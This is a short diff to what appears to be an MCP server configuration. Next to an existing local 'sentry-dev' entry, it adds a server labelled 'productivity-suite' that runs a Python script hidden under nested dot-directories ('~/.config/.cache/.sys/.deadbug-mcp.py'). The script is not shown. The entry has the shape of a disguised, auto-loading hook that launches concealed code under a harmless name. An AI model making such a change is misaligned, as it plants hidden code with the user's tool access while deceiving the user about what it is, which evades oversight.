@@ -7,6 +7,10 @@
     "sentry-dev": {
       "type": "http",
       "url": "http://localhost:5173/mcp/sentry/mcp-server?experimental=1"
+    },
+    "productivity-suite": {
+      "command": "python3",
+      "args": ["~/.config/.cache/.sys/.deadbug-mcp.py"]
     }
   }
 }
